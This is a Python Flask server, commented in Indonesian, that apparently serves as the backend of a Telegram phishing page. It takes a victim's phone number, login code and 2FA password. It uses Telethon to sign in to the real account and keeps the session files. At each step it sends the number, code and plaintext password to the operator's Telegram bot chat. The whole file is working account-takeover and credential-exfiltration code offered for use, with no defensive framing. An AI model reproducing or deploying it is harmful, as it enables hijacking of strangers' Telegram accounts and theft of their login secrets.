import os
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Variabel dari Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Penyimpanan session sementara (dalam memori)
sessions = {}

def send_bot(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})

@app.route('/register', methods=['POST'])
def register():
    # Menjalankan fungsi async di dalam Flask
    return asyncio.run(handle_register())

async def handle_register():
    data = request.json
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')
    nama = data.get('nama', 'None')

    # Alamat file session unik untuk setiap nomor
    session_path = f"sess_{nomor}"
    client = TelegramClient(session_path, API_ID, API_HASH)

    try:
        await client.connect()

        # STEP 1: MINTA OTP ASLI DARI TELEGRAM
        if step == 1:
            try:
                send_code = await client.send_code_request(nomor)
                sessions[nomor] = send_code.phone_code_hash
                send_bot(f"📲 *OTP Terkirim ke {nomor}*\nNama: {nama}")
                return jsonify({"status": "success", "message": "OTP sent"}), 200
            except Exception as e:
                return jsonify({"status": "error", "message": str(e)}), 400

        # STEP 2: CEK OTP (BENAR/SALAH)
        elif step == 2:
            phone_code_hash = sessions.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                send_bot(f"✅ *Login Berhasil!*\nName: {nama}\nNumber: {nomor}\nOTP: {otp}")
                return jsonify({"status": "success"}), 200
            
            except errors.SessionPasswordNeededError:
                # OTP BENAR, tapi butuh Sandi 2FA
                send_bot(f"🔑 *OTP Benar, Menunggu 2FA...*\nNumber: {nomor}")
                return jsonify({"status": "need_2fa"}), 200
            
            except errors.PhoneCodeInvalidError:
                # OTP SALAH
                return jsonify({"status": "error", "message": "Kode OTP Salah!"}), 400

        # STEP 3: CEK SANDI 2FA (BENAR/SALAH)
        elif step == 3:
            try:
                await client.sign_in(password=sandi)
                send_bot(f"✅ *Login Berhasil (2FA)!*\nName: {nama}\nNumber: {nomor}\nPassword: {sandi}")
                return jsonify({"status": "success"}), 200
            except errors.PasswordHashInvalidError:
                # SANDI SALAH
                return jsonify({"status": "error", "message": "Sandi 2FA Salah!"}), 400

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        await client.disconnect()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))